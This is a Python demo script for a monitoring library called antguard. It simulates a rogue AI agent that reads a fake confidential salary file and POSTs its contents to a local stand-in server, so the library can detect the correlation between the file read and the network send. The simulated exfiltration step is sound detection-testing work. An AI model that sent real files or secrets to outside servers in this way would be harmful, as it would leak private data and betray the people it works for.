"""
antguard Demo 2: Data Exfiltration Detection
=============================================
Simulates an AI agent reading confidential data and sending it
to a local test server. antguard detects the correlation between
file read and network send.

Run: python demo_02_exfiltration_detection.py
"""

import os
import time
import json
import tempfile
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from antguard import Guard


class _SilentHandler(BaseHTTPRequestHandler):
    """Fake external server that receives data (simulates exfiltration target)."""

    received_data = []

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        _SilentHandler.received_data.append(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass  # silence server logs


def start_fake_server(port=18080):
    server = HTTPServer(("127.0.0.1", port), _SilentHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def main():
    print("=" * 60)
    print("antguard Demo 2: Data Exfiltration Detection")
    print("Guard. Detect. Protect.")
    print("=" * 60)

    # start fake external server
    port = 18080
    server = start_fake_server(port)
    print(f"\n[Setup] Fake external server running on 127.0.0.1:{port}")

    with tempfile.TemporaryDirectory() as tmpdir:
        data_dir = os.path.join(tmpdir, "confidential")
        log_dir = os.path.join(tmpdir, "logs")
        os.makedirs(data_dir)

        # create confidential file
        salary_file = os.path.join(data_dir, "salary_report.csv")
        salary_content = (
            "CONFIDENTIAL - Ant Technologies\n"
            "Employee Salary Report 2026\n\n"
            "Employee,Role,Salary,Aadhaar\n"
            "Ravi Kumar,Engineer,2500000,1234-5678-9012\n"
            "Priya Shah,Manager,3200000,9876-5432-1098\n"
            "Amit Patel,Director,4500000,5555-6666-7777\n"
            "Deepa Nair,VP,6000000,8888-9999-0000\n"
        )
        with open(salary_file, "w") as f:
            f.write(salary_content)

        file_size = len(salary_content.encode())
        print(f"[Setup] Created confidential file: salary_report.csv ({file_size} bytes)")
        print("\nStarting antguard profiler...\n")

        with Guard(
            watch=[data_dir],
            detect_outbound=True,
            track_processes=True,
            correlate=True,
            runtime=True,
            gpu=False,
            log_path=log_dir,
            network_interval=0.5,
            runtime_interval=0.5,
        ) as g:
            print("--- Simulating Malicious Agent ---\n")

            # step 1: agent reads confidential file
            print("[Agent] Reading salary_report.csv...")
            with open(salary_file, "r") as f:
                stolen_data = f.read()
            time.sleep(1)

            # step 2: agent processes data
            print("[Agent] Processing data...")
            time.sleep(0.5)

            # step 3: agent sends data to external server
            print(f"[Agent] Sending data to external server (127.0.0.1:{port})...")
            try:
                import urllib.request
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/upload",
                    data=stolen_data.encode(),
                    method="POST",
                )
                urllib.request.urlopen(req, timeout=5)
                print("[Agent] Data sent successfully!")
            except Exception as e:
                print(f"[Agent] Send attempted (connection: {e})")

            time.sleep(2)
            print("\n--- Agent Finished ---\n")

        # results
        print("=" * 60)
        print("ANTGUARD DETECTION RESULTS")
        print("=" * 60)

        data_left = g.did_data_leave()
        risk = g.risk_level()

        print(f"\nDATA LEFT SYSTEM: {'YES !!!' if data_left else 'NO'}")
        print(f"RISK LEVEL: {risk.name}")
        print(f"\nFile events: {len(g.file_events())}")
        print(f"Network events: {len(g.net_events())}")
        print(f"Process events: {len(g.proc_events())}")
        print(f"Byte-flow correlations: {len(g.correlations())}")

        # show network events
        if g.net_events():
            print("\nNetwork Events Detected:")
            for ev in g.net_events():
                print(f"  [{ev.risk.name:8s}] {ev.destination}:{ev.port} "
                      f"sent={ev.bytes_sent} bytes "
                      f"proc={ev.process_name} "
                      f"external={ev.is_external} "
                      f"first_seen={ev.first_seen}")

        # show correlations
        if g.correlations():
            print("\nByte-Flow Correlations:")
            for m in g.correlations():
                print(f"  FILE: {os.path.basename(m.source_file)} ({m.file_size} bytes)")
                print(f"  -> DEST: {m.destination}:{m.destination_port} ({m.outbound_size} bytes)")
                print(f"     Method: {m.method}")
                print(f"     Confidence: {m.confidence:.2f}")
                print(f"     Time gap: {m.time_gap_sec:.1f}s")
                print(f"     Risk: {m.risk.name}")
        else:
            print("\nNo byte-flow correlations (server was local network)")

        # data flow map
        dfm = g.data_flow_map()
        print(f"\nData Flow Map:")
        print(f"  Files accessed: {len(dfm['files_accessed'])}")
        print(f"  Outbound connections: {len(dfm['outbound'])}")
        for out in dfm["outbound"]:
            print(f"    -> {out['destination']} ({out['bytes_sent']} bytes via {out['process']})")

        # show matched files
        matched = g.matched_files()
        if matched:
            print(f"\nFiles detected in outbound data:")
            for f in matched:
                print(f"  {os.path.basename(f)}")

        # runtime
        metrics = g.runtime_metrics()
        if metrics:
            print(f"\nRuntime:")
            print(f"  CPU avg/peak: {metrics.cpu_avg:.1f}% / {metrics.cpu_peak:.1f}%")
            if metrics.anomalies:
                print(f"  Anomalies: {', '.join(metrics.anomalies)}")

        # save reports
        paths = g.save(log_dir)
        print(f"\nReports saved to {log_dir}")

        # print full report
        print("\n" + "=" * 60)
        print("FULL TEXT REPORT")
        print("=" * 60)
        with open(paths["txt"]) as f:
            print(f.read())

    server.shutdown()


if __name__ == "__main__":
    main()
